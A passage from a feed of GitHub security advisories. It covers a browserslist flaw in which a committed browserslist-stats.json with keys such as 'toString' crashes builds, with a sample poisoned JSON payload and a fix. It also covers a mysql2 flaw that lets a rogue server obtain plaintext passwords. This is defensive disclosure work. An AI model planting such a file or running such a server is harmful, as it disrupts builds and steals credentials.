    if (versions.length === 1 &amp;&amp; data[i] &amp;&amp; data[i].versions.length === 1) {
      var normal = data[i].versions[0]
      normalized[i] = {}
      normalized[i][normal] = stats[i][versions[0]]
    } else {
      normalized[i] = stats[i]
    }
  }
  return normalized
}
</code></pre>
<p><code>stats</code> is untrusted: it comes from <code>JSON.parse()</code>-ing a
<code>browserslist-stats.json</code> file — auto-discovered by walking up the directory
tree from the project root <strong>on every <code>browserslist()</code> call, regardless of
the query</strong> (<code>env.getStat(opts, browserslist.data)</code> runs unconditionally
inside <code>browserslist()</code>) — or from <code>opts.stats</code> passed programmatically /
via the CLI's <code>--stats=</code> flag. <code>data</code> is <code>browserslist.data</code>, a plain object
populated only with real browser names.</p>
<p>Two independent bugs from the same root cause (unguarded <code>for...in</code> over
untrusted keys used with plain-object bracket access/assignment):</p>
<ol>
<li><strong>Crash</strong>: <code>data[i]</code> has no <code>hasOwnProperty</code> guard. If <code>stats</code> contains a
key that also happens to be an inherited <code>Object.prototype</code> member name —
<code>"__proto__"</code>, <code>"toString"</code>, <code>"valueOf"</code>, <code>"constructor"</code>,
<code>"hasOwnProperty"</code>, <code>"isPrototypeOf"</code>, etc. — <code>data[i]</code> resolves to that
inherited function/object (always truthy), and the code then does
<code>data[i].versions.length</code> → <code>undefined.length</code> → <strong>uncaught <code>TypeError</code></strong>,
for any such key whose JSON value has exactly one sub-key, e.g.:<pre><code class="language-json">{ "toString": { "onekey": 5 }, "chrome": { "100": 50 } }
</code></pre>
</li>
<li><strong>Prototype write</strong>: <code>normalized[i] = ...</code> on the fresh
<code>normalized = {}</code> — if <code>i</code> is exactly <code>"__proto__"</code> (and <code>normalized</code> has
no own property by that name yet), this computed assignment invokes the
real <code>Object.prototype.__proto__</code> setter, changing <code>normalized</code>'s actual
<code>[[Prototype]]</code> instead of creating a plain property.</li>
</ol>
<p>Because this runs on <strong>every</strong> <code>browserslist()</code> call regardless of the
query, simply committing a poisoned <code>browserslist-stats.json</code> anywhere in a
project's directory tree breaks every subsequent Browserslist call in that
project — including calls made by Autoprefixer, Babel <code>preset-env</code>,
Stylelint, or PostCSS internally, for completely unrelated queries.</p>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker submits a PR (or a compromised dependency) adding a
<code>browserslist-stats.json</code> file anywhere between the project root and
filesystem root, containing e.g.
<code>{"toString": {"onekey": 5}, "chrome": {"100": 50}}</code>.</li>
<li>The victim's build/CI pipeline runs any tool that calls <code>browserslist()</code>
internally, for <strong>any</strong> query.</li>
<li>The auto-discovered poisoned file crashes the process with an uncaught
<code>TypeError</code> on the very first call.</li>
</ol>
<h3 id="measured-impact">Measured Impact</h3>
<p>Confirmed crash (real <code>browserslist()</code> call, v4.28.6) with <code>stats</code> keys:
<code>__proto__</code>, <code>toString</code>, <code>valueOf</code>, <code>hasOwnProperty</code>, <code>constructor</code>,
<code>isPrototypeOf</code> — each paired with a one-key JSON object — for any query,
including <code>browserslist('defaults')</code> which never mentions stats.</p>
<h3 id="recommended-fix-implemented-and-verified">Recommended Fix (implemented and verified)</h3>
<pre><code class="language-js">var normalized = Object.create(null)
for (var i in stats) {
  var versions = Object.keys(stats[i])
  var known = Object.prototype.hasOwnProperty.call(data, i) &amp;&amp; data[i]
  if (versions.length === 1 &amp;&amp; known &amp;&amp; known.versions.length === 1) {
    var normal = known.versions[0]
    normalized[i] = Object.create(null)
    normalized[i][normal] = stats[i][versions[0]]
  } else {
    normalized[i] = stats[i]
  }
}
return normalized
</code></pre>
<p><code>normalized</code> uses <code>Object.create(null)</code> so a write to <code>"__proto__"</code> is an
ordinary property set, never a <code>[[Prototype]]</code> change; <code>data[i]</code> is replaced
with an explicit <code>hasOwnProperty</code> check so it never resolves to an inherited
<code>Object.prototype</code> member.</p>
<p><strong>Verification</strong>:</p>
<ul>
<li><code>NODE_ENV=test npx uvu test .test.js</code> → 301/301 pass unmodified
(<code>test/custom.test.js</code>, <code>test/shareable-stats.test.js</code>, <code>test/cover.test.js</code>
exercise the stats-handling paths).</li>
<li>All 6 previously crash-inducing keys, tested individually, now resolve
without error.</li>
<li>The realistic file-based auto-discovery scenario (poisoned
<code>browserslist-stats.json</code> + an unrelated <code>browserslist('defaults')</code> call)
now returns a normal result instead of crashing.</li>
</ul>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Who is affected</strong>: Any project whose build/CI invokes Browserslist
(directly or via Autoprefixer/Babel/Stylelint/PostCSS) in a directory tree
an attacker can place a file into (external PR, compromised dependency),
or any app that passes user-influenced data into <code>opts.stats</code>.</li>
<li><strong>What an attacker achieves</strong>: Immediate DoS — crashes the invoking
process on the first Browserslist call after the file is present, for any
query, no special syntax needed.</li>
<li><strong>Conditions required</strong>: No authentication — only the ability to add a
file to the project's directory tree, or influence <code>opts.stats</code>.</li>
</ul>
<h3 id="verification-environment">Verification Environment</h3>
<p>browserslist @ HEAD (== v4.28.6, current latest stable release) under local
Node.js v20.19.5. Pure JS library — executed directly, no server needed.</p>
<h3 id="note">Note</h3>
<p>Found via a systematic review of prototype-pollution-adjacent patterns in
this codebase after confirming two unrelated algorithmic-complexity issues
(reported separately as GHSA-rrmg-cfrq-23vv and GHSA-g6p8-hj8g-x889) in the
same research pass. A similar <code>for...in</code> + bracket-write pattern in
<code>index.js</code>'s <code>copyObject()</code> (used by <code>normalizeAndroidData</code>) was already
guarded against <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> keys by a prior,
unrelated commit — that guard was never applied to this function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/browserslist/browserslist/security/advisories/GHSA-73wf-gq98-2v4g">https://github.com/browserslist/browserslist/security/advisories/GHSA-73wf-gq98-2v4g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73088">https://nvd.nist.gov/vuln/detail/CVE-2026-73088</a></li>
<li><a href="https://github.com/browserslist/browserslist/commit/f9914ad9effc865ccc27d816255625890b31ca51">https://github.com/browserslist/browserslist/commit/f9914ad9effc865ccc27d816255625890b31ca51</a></li>
<li><a href="https://github.com/browserslist/browserslist/releases/tag/4.28.7">https://github.com/browserslist/browserslist/releases/tag/4.28.7</a></li>
<li><a href="https://github.com/advisories/GHSA-73wf-gq98-2v4g">https://github.com/advisories/GHSA-73wf-gq98-2v4g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73wf-gq98-2v4g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-01T16:41:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mysql2] MySQL2: Auth Plugin Downgrade to mysql_clear_password Leaks Plaintext Credentials]]></title>
        <id>https://github.com/advisories/GHSA-3f6p-5ww8-9rcr</id>
        <link href="https://github.com/advisories/GHSA-3f6p-5ww8-9rcr"/>
        <updated>2026-09-01T16:40:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A rogue MySQL server (or MITM) can force mysql2 to send credentials in <strong>plaintext</strong> by requesting an auth switch to <code>mysql_clear_password</code>. The driver complies without verifying that TLS is active.</p>
<h2 id="details">Details</h2>
<p><code>mysql_clear_password</code> is registered as a default standard plugin in <code>lib/commands/auth_switch.js</code> (line 21). When a server sends an AuthSwitchRequest (0xFE) requesting <code>mysql_clear_password</code>, the driver executes it without checking for TLS. The plugin (<code>lib/auth_plugins/mysql_clear_password.js</code>) returns <code>Buffer.from(password + '\0')</code>.</p>
<p>Note: <code>caching_sha2_password</code> plugin DOES check for SSL before sending cleartext (line 77). But <code>mysql_clear_password</code> has no such guard.</p>
<h2 id="attack-scenario">Attack Scenario</h2>
<ol>
<li>Attacker operates rogue MySQL server or performs MITM</li>
<li>Server advertises <code>caching_sha2_password</code> in handshake</li>
<li>Client sends hashed auth response</li>
<li>Server replies with AuthSwitchRequest to <code>mysql_clear_password</code></li>
<li>Client sends password in plaintext</li>
<li>Attacker captures plaintext password</li>
</ol>
<h2 id="poc">PoC</h2>
<p>Rogue MySQL server (Node.js, ~80 lines) that captures plaintext passwords from mysql2 clients. Tested against mysql2 3.20.0. Full PoC available on request.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Remove <code>mysql_clear_password</code> from <code>standardAuthPlugins</code>, or add a guard requiring TLS/unix socket before allowing cleartext auth.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>mysql2: 9M weekly downloads</li>
<li>Any application connecting without TLS is vulnerable to credential theft</li>
<li>Cloud environments with untrusted network paths are especially at risk</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sidorares/node-mysql2/security/advisories/GHSA-3f6p-5ww8-9rcr">https://github.com/sidorares/node-mysql2/security/advisories/GHSA-3f6p-5ww8-9rcr</a></li>
<li><a href="https://github.com/sidorares/node-mysql2/issues/1617">https://github.com/sidorares/node-mysql2/issues/1617</a></li>
<li><a href="https://github.com/sidorares/node-mysql2/pull/4236">https://github.com/sidorares/node-mysql2/pull/4236</a></li>
<li><a href="https://github.com/sidorares/node-mysql2/commit/884bec56288d827939d0dd3f1f4ae476fbc8dbeb">https://github.com/sidorares/node-mysql2/commit/884bec56288d827939d0dd3f1f4ae476fbc8dbeb</a></li>
<li><a href="https://github.com/sidorares/node-mysql2/releases/tag/v3.22.0">https://github.com/sidorares/node-mysql2/releases/tag/v3.22.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3f6p-5ww8-9rcr">https://github.com/advisories/GHSA-3f6p-5ww8-9rcr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3f6p-5ww8-9rcr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-01T16:40:34.000Z</published>
    </entry>
</feed>